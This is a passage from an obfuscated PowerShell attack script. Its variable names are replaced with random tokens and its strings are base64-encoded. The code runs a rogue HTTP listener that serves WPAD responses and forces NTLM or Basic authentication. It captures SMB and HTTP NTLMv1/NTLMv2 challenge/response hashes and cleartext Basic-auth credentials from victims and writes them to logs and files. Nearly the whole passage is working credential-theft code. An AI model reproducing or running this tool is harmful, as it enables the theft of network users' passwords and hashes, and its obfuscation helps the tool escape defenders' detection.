                    ${16d95bc536294b25bb44a9552e896bfd} = ${16d95bc536294b25bb44a9552e896bfd}.Insert(48,':')
                    ${1a5b3654ca134f6abd493f9e44be8d0d} = ${5c77816d70fb4f3c9b4c1646cf38d6bf} + "::" + ${f183eb3cd96c4a66ab9e36d3725e3789} + ":" + ${16d95bc536294b25bb44a9552e896bfd} + ":" + ${0bd5ba00bfd54a85948d76bfd4b4ef11}
                    if((${2940dc5f22dc4ba18210d4acc5b9ff8f} -ne ${abd19e74908a450e847564f92e2000eb}) -and ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'y') -or ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'n') -and (-not ${5c77816d70fb4f3c9b4c1646cf38d6bf}.EndsWith('$')))))
                    {    
                        ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - SMB NTLMv1 challenge/response for ${f183eb3cd96c4a66ab9e36d3725e3789}\${5c77816d70fb4f3c9b4c1646cf38d6bf} captured from ${2940dc5f22dc4ba18210d4acc5b9ff8f}(${43cf8e406e0f41ef86318fa596905f39})")])
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue.add(${1a5b3654ca134f6abd493f9e44be8d0d})
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list.add(${1a5b3654ca134f6abd493f9e44be8d0d})
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') SMB NTLMv1 challenge/response captured from ${2940dc5f22dc4ba18210d4acc5b9ff8f}(${43cf8e406e0f41ef86318fa596905f39}):`n${1a5b3654ca134f6abd493f9e44be8d0d}")
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABOAFQATABNAHYAMQAgAGMAaABhAGwAbABlAG4AZwBlAC8AcgBlAHMAcABvAG4AcwBlACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAA=='))) + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_out_file)
                        }
                    }
                }
                if ((${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list -notcontains ${2940dc5f22dc4ba18210d4acc5b9ff8f}) -and (-not ${5c77816d70fb4f3c9b4c1646cf38d6bf}.EndsWith('$')) -and (!${98a67e4723ee472fa2340d2ec14a0f94}.spoofer_repeat) -and (${2940dc5f22dc4ba18210d4acc5b9ff8f} -ne ${abd19e74908a450e847564f92e2000eb}))
                {
                    ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list += ${2940dc5f22dc4ba18210d4acc5b9ff8f}
                }
            }
        }
    }
}
${9a8f958a8dbf44f2a96ea8decf7a0c63} = 
{ 
    param (${edc4d2f44c8e4e63b7b00dfe56110aca},${aee1694b16de43f98158814241da1ee1},${d4dc92f8b9e04a91be5eb7099818dc83},${e0502cdf78554c8c80746316292c02fb})
    Function NTLMChallengeBase64
    {
        ${c93616988d53412a89651611c84bb042} = Get-Date
        ${c93616988d53412a89651611c84bb042} = ${c93616988d53412a89651611c84bb042}.ToFileTime()
        ${c93616988d53412a89651611c84bb042} = [BitConverter]::ToString([BitConverter]::GetBytes(${c93616988d53412a89651611c84bb042}))
        ${c93616988d53412a89651611c84bb042} = ${c93616988d53412a89651611c84bb042}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        if(${98a67e4723ee472fa2340d2ec14a0f94}.challenge)
        {
            ${64da7b42007b40c29a7eb3188e85bc5e} = ${98a67e4723ee472fa2340d2ec14a0f94}.challenge
            ${9cda7c04280748cd8bdaa16a3c68bfc6} = ${98a67e4723ee472fa2340d2ec14a0f94}.challenge.Insert(2,'-').Insert(5,'-').Insert(8,'-').Insert(11,'-').Insert(14,'-').Insert(17,'-').Insert(20,'-')
            ${9cda7c04280748cd8bdaa16a3c68bfc6} = ${9cda7c04280748cd8bdaa16a3c68bfc6}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        else
        {
            ${9cda7c04280748cd8bdaa16a3c68bfc6} = [String](1..8 | % {$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ewAwADoAWAAyAH0A'))) -f (Get-Random -Minimum 1 -Maximum 255)})
            ${64da7b42007b40c29a7eb3188e85bc5e} = ${9cda7c04280748cd8bdaa16a3c68bfc6} -replace ' ', ''
            ${9cda7c04280748cd8bdaa16a3c68bfc6} = ${9cda7c04280748cd8bdaa16a3c68bfc6}.Split(" ") | %{ [CHAR][CONVERT]::toint16($_,16)}
        }
        ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_challenge_queue.Add(${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address.IPAddressToString + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Port + ',' + ${64da7b42007b40c29a7eb3188e85bc5e}) |Out-Null
        [byte[]]$HTTP_NTLM_bytes = (0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x06,0x00,0x06,0x00,0x38,0x00,0x00,0x00,0x05,0x82,0x89,0xa2)`
            + ${9cda7c04280748cd8bdaa16a3c68bfc6}`
            + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x82,0x00,0x82,0x00,0x3e,0x00,0x00,0x00,0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f,0x4c,0x00,0x41,0x00,0x42,0x00)`
            + (0x02,0x00,0x06,0x00,0x4c,0x00,0x41,0x00,0x42,0x00,0x01,0x00,0x10,0x00,0x48,0x00,0x4f,0x00,0x53,0x00,0x54,0x00,0x4e,0x00,0x41,0x00,0x4d,0x00,0x45,0x00)`
            + (0x04,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x03,0x00,0x24,0x00,0x68,0x00,0x6f,0x00)`
            + (0x73,0x00,0x74,0x00,0x6e,0x00,0x61,0x00,0x6d,0x00,0x65,0x00,0x2e,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00)`
            + (0x6c,0x00,0x05,0x00,0x12,0x00,0x6c,0x00,0x61,0x00,0x62,0x00,0x2e,0x00,0x6c,0x00,0x6f,0x00,0x63,0x00,0x61,0x00,0x6c,0x00,0x07,0x00,0x08,0x00)`
            + ${c93616988d53412a89651611c84bb042}`
            + (0x00,0x00,0x00,0x00,0x0a,0x0a)
        ${55577da3be134d70b7d49d1cc8756cc6} = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
        ${b46c8977ba24473ba75cf01940ab886f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))) + ${55577da3be134d70b7d49d1cc8756cc6}
        ${0bd5ba00bfd54a85948d76bfd4b4ef11} = ${64da7b42007b40c29a7eb3188e85bc5e}
        Return ${b46c8977ba24473ba75cf01940ab886f}
    }
    while(${98a67e4723ee472fa2340d2ec14a0f94}.running)
    {
        ${98a67e4723ee472fa2340d2ec14a0f94}.context = ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.GetContext() 
        ${98a67e4723ee472fa2340d2ec14a0f94}.request = ${98a67e4723ee472fa2340d2ec14a0f94}.context.Request
        ${98a67e4723ee472fa2340d2ec14a0f94}.response = ${98a67e4723ee472fa2340d2ec14a0f94}.context.Response
        if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory -and ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_EXE -and (${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -like $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAuAGUAeABlAA==')))) -and (Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_EXE)) -and !(Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl)))
        {
            [byte[]] $HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_EXE))
        }
        elseif(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory)
        {
            if((${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file) -and !(Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl)) -and (Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file)) -and (${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))))
            {
                [byte[]] $HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file))
            }
            elseif((${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file) -and (${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -eq '/') -and (Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file)))
            {
                [byte[]] $HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_default_file))
            }
            elseif((${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response) -and (${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))))
            {
                [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes(${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response)
            }
            else 
            {
                if(Test-Path (Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl))
                {
                    [byte[]] $HTTP_buffer = [System.IO.File]::ReadAllBytes((Join-Path ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_directory ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl))
                }
                else
                {
                    [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_response)
                }
            }
        }
        else
        {
            if(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_response)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.message = ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_response
            }
            elseif(${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA'))))
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.message = ${98a67e4723ee472fa2340d2ec14a0f94}.WPAD_response
            }
            else
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.message = ''
            }
            [byte[]] $HTTP_buffer = [System.Text.Encoding]::UTF8.GetBytes(${98a67e4723ee472fa2340d2ec14a0f94}.message)
        }
        ${b46c8977ba24473ba75cf01940ab886f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
        ${3eb1cb7366a64050851a9d33536502ad} = $false
        if(${98a67e4723ee472fa2340d2ec14a0f94}.request.IsSecureConnection)
        {
            ${98ce7d8891f7495bb35a430c6a22e19a} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTAA==')))
        }
        else
        {
            ${98ce7d8891f7495bb35a430c6a22e19a} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAA=')))
        }
        if((${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and (${e0502cdf78554c8c80746316292c02fb} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA')))))
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 200
        }
        else
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 401
        }
        if (!${98a67e4723ee472fa2340d2ec14a0f94}.request.headers[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgA=')))])
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - ${98ce7d8891f7495bb35a430c6a22e19a} request for " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address)
            ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - ${98ce7d8891f7495bb35a430c6a22e19a} request for " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IAByAGUAYwBlAGkAdgBlAGQAIABmAHIAbwBtACAA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address)])
        }
        [string]${11a4c090486b4057b628261277f3abfd} = ${98a67e4723ee472fa2340d2ec14a0f94}.request.headers.getvalues($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABvAHIAaQB6AGEAdABpAG8AbgA='))))
        if(${11a4c090486b4057b628261277f3abfd}.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA==')))))
        {
            ${11a4c090486b4057b628261277f3abfd} = ${11a4c090486b4057b628261277f3abfd} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQAgAA=='))),''
            [byte[]] $HTTP_request_bytes = [System.Convert]::FromBase64String(${11a4c090486b4057b628261277f3abfd})
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 401
            if($HTTP_request_bytes[8] -eq 1)
            {   
                ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 401
                ${b46c8977ba24473ba75cf01940ab886f} = NTLMChallengeBase64
            }
            elseif($HTTP_request_bytes[8] -eq 3)
            {
                ${b46c8977ba24473ba75cf01940ab886f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
                ${569d788db4e94f658416507439606de0} = $HTTP_request_bytes[24]
                ${e0dbe4caff4c46e9a8c3d09ea0728292} = DataLength 22 $HTTP_request_bytes
                ${7e38edf6d4bb4659863490caafe1534a} = DataLength 28 $HTTP_request_bytes
                ${5f4c5545141b4745b12e92d941694366} = DataLength 32 $HTTP_request_bytes
                [string]${0bd5ba00bfd54a85948d76bfd4b4ef11} = ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_challenge_queue -like ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address.IPAddressToString + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Port + '*'
                ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_challenge_queue.Remove(${0bd5ba00bfd54a85948d76bfd4b4ef11})
                ${0bd5ba00bfd54a85948d76bfd4b4ef11} = ${0bd5ba00bfd54a85948d76bfd4b4ef11}.Substring((${0bd5ba00bfd54a85948d76bfd4b4ef11}.IndexOf(","))+1)
                if(${7e38edf6d4bb4659863490caafe1534a} -eq 0)
                {
                    ${b1bf3e98711943bbaf490fd6e1857ee5} = ''
                }
                else
                {  
                    ${b1bf3e98711943bbaf490fd6e1857ee5} = DataToString ${7e38edf6d4bb4659863490caafe1534a} 0 0 ${5f4c5545141b4745b12e92d941694366} $HTTP_request_bytes
                } 
                ${e714727f32034cb694b1e05bd8e7290c} = DataLength 36 $HTTP_request_bytes
                ${ee4aa43ab3fa47baa41016a898e43b73} = DataToString ${e714727f32034cb694b1e05bd8e7290c} ${7e38edf6d4bb4659863490caafe1534a} 0 ${5f4c5545141b4745b12e92d941694366} $HTTP_request_bytes
                ${185796e944a74482a7607a8a64a85f09} = DataLength 44 $HTTP_request_bytes
                ${4ea8d0b5d74d431b8144a39908e9471c} = DataToString ${185796e944a74482a7607a8a64a85f09} ${7e38edf6d4bb4659863490caafe1534a} ${e714727f32034cb694b1e05bd8e7290c} ${5f4c5545141b4745b12e92d941694366} $HTTP_request_bytes
                if(${e0dbe4caff4c46e9a8c3d09ea0728292} -eq 24) 
                {
                    ${ea845ef466a74d9e8995337b5a8fcaaf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADEA')))
                    ${c7103df53aa848139cc86440d4a5724b} = [System.BitConverter]::ToString($HTTP_request_bytes[(${569d788db4e94f658416507439606de0} - 24)..(${569d788db4e94f658416507439606de0} + ${e0dbe4caff4c46e9a8c3d09ea0728292})]) -replace "-",""
                    ${c7103df53aa848139cc86440d4a5724b} = ${c7103df53aa848139cc86440d4a5724b}.Insert(48,':')
                    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash = ${ee4aa43ab3fa47baa41016a898e43b73} + "::" + ${b1bf3e98711943bbaf490fd6e1857ee5} + ":" + ${c7103df53aa848139cc86440d4a5724b} + ":" + ${0bd5ba00bfd54a85948d76bfd4b4ef11}
                    if(((${0bd5ba00bfd54a85948d76bfd4b4ef11} -ne '') -and (${c7103df53aa848139cc86440d4a5724b} -ne '')) -and ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'y') -or ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'n') -and (-not ${ee4aa43ab3fa47baa41016a898e43b73}.EndsWith('$')))))
                    {    
                        ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - ${98ce7d8891f7495bb35a430c6a22e19a} NTLMv1 challenge/response for ${b1bf3e98711943bbaf490fd6e1857ee5}\${ee4aa43ab3fa47baa41016a898e43b73} captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address + "(" + ${4ea8d0b5d74d431b8144a39908e9471c} + ")")])
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_file_queue.add(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_list.add(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - ${98ce7d8891f7495bb35a430c6a22e19a} NTLMv1 challenge/response captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address + "(" + ${4ea8d0b5d74d431b8144a39908e9471c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("${98ce7d8891f7495bb35a430c6a22e19a} NTLMv1 challenge/response written to " + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv1_out_file)
                        }                   
                    }
                    if ((${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list -notcontains ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address) -and (-not ${ee4aa43ab3fa47baa41016a898e43b73}.EndsWith('$')) -and (!${98a67e4723ee472fa2340d2ec14a0f94}.spoofer_repeat))
                    {
                        ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list += ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address
                    }
                }
                else 
                {   
                    ${ea845ef466a74d9e8995337b5a8fcaaf} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQB2ADIA')))           
                    ${c7103df53aa848139cc86440d4a5724b} = [System.BitConverter]::ToString($HTTP_request_bytes[${569d788db4e94f658416507439606de0}..(${569d788db4e94f658416507439606de0} + ${e0dbe4caff4c46e9a8c3d09ea0728292})]) -replace "-",""
                    ${c7103df53aa848139cc86440d4a5724b} = ${c7103df53aa848139cc86440d4a5724b}.Insert(32,':')
                    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash = ${ee4aa43ab3fa47baa41016a898e43b73} + "::" + ${b1bf3e98711943bbaf490fd6e1857ee5} + ":" + ${0bd5ba00bfd54a85948d76bfd4b4ef11} + ":" + ${c7103df53aa848139cc86440d4a5724b}
                    if(((${0bd5ba00bfd54a85948d76bfd4b4ef11} -ne '') -and (${c7103df53aa848139cc86440d4a5724b} -ne '')) -and ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'y') -or ((${d4dc92f8b9e04a91be5eb7099818dc83} -eq 'n') -and (-not ${ee4aa43ab3fa47baa41016a898e43b73}.EndsWith('$')))))
                    {
                        ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add($(Get-Date -format 's') + " - ${98ce7d8891f7495bb35a430c6a22e19a} NTLMv2 challenge/response for ${b1bf3e98711943bbaf490fd6e1857ee5}\${ee4aa43ab3fa47baa41016a898e43b73} captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.address + "(" + ${4ea8d0b5d74d431b8144a39908e9471c} + ")")])
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_file_queue.add(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_list.add(${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add($(Get-Date -format 's') + " - ${98ce7d8891f7495bb35a430c6a22e19a} NTLMv2 challenge/response captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.address + "(" + ${4ea8d0b5d74d431b8144a39908e9471c} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KQA6AAoA'))) + ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_NTLM_hash)
                        if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
                        {
                            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("${98ce7d8891f7495bb35a430c6a22e19a} NTLMv2 challenge/response written to " + ${98a67e4723ee472fa2340d2ec14a0f94}.NTLMv2_out_file)
                        }  
                    }
                    if ((${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list -notcontains ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address) -and (-not ${ee4aa43ab3fa47baa41016a898e43b73}.EndsWith('$')) -and (!${98a67e4723ee472fa2340d2ec14a0f94}.spoofer_repeat))
                    {
                        ${98a67e4723ee472fa2340d2ec14a0f94}.IP_capture_list += ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.Address
                    }
                }
                ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 200
                ${3eb1cb7366a64050851a9d33536502ad} = $true
                ${0bd5ba00bfd54a85948d76bfd4b4ef11} = ''
            }
            else
            {
                ${b46c8977ba24473ba75cf01940ab886f} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA=')))
            }
        }
        elseif(${11a4c090486b4057b628261277f3abfd}.startswith($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA'))))) 
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 200
            ${11a4c090486b4057b628261277f3abfd} = ${11a4c090486b4057b628261277f3abfd} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAA'))),''
            ${cd25b95f81574c86bb40577274cdb836} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(${11a4c090486b4057b628261277f3abfd}))
            ${98a67e4723ee472fa2340d2ec14a0f94}.log.add(${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue[${98a67e4723ee472fa2340d2ec14a0f94}.log_file_queue.add("$(Get-Date -format 's') - Basic auth cleartext credentials captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.address)])
            ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_file_queue.add(${cd25b95f81574c86bb40577274cdb836})
            ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_list.add(${cd25b95f81574c86bb40577274cdb836})
            ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add("$(Get-Date -format 's') - Basic auth cleartext credentials ${cd25b95f81574c86bb40577274cdb836} captured from " + ${98a67e4723ee472fa2340d2ec14a0f94}.request.RemoteEndpoint.address)
            if(${98a67e4723ee472fa2340d2ec14a0f94}.file_output)
            {
                ${98a67e4723ee472fa2340d2ec14a0f94}.console_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjACAAYQB1AHQAaAAgAGMAbABlAGEAcgB0AGUAeAB0ACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAdwByAGkAdAB0AGUAbgAgAHQAbwAgAA=='))) + ${98a67e4723ee472fa2340d2ec14a0f94}.cleartext_out_file)
            }     
        }
        if((${edc4d2f44c8e4e63b7b00dfe56110aca} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))) -and ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or (${e0502cdf78554c8c80746316292c02fb} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQA='))) -and ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -and !${3eb1cb7366a64050851a9d33536502ad})
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.AddHeader($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBXAFcALQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQA='))),${b46c8977ba24473ba75cf01940ab886f})
        }
        elseif((${edc4d2f44c8e4e63b7b00dfe56110aca} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))) -or (${e0502cdf78554c8c80746316292c02fb} -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAaQBjAA=='))) -and ${98a67e4723ee472fa2340d2ec14a0f94}.request.RawUrl -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LwB3AHAAYQBkAC4AZABhAHQA')))))
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.AddHeader($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBXAFcALQBBAHUAdABoAGUAbgB0AGkAYwBhAHQAZQA='))),"Basic realm=${aee1694b16de43f98158814241da1ee1}")
        }
        else
        {
            ${98a67e4723ee472fa2340d2ec14a0f94}.response.StatusCode = 200
        }
        ${98a67e4723ee472fa2340d2ec14a0f94}.response.ContentLength64 = $HTTP_buffer.length
        ${cd4f766e811b4cb998450f96f14edb1c} = ${98a67e4723ee472fa2340d2ec14a0f94}.response.OutputStream
        ${cd4f766e811b4cb998450f96f14edb1c}.write($HTTP_buffer, 0, $HTTP_buffer.length)
        ${cd4f766e811b4cb998450f96f14edb1c}.close()
    }
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Stop()
    ${98a67e4723ee472fa2340d2ec14a0f94}.HTTP_listener.Close()
}
${2b0529ce8e854acda3f9477a6b4c1d93} = 
{
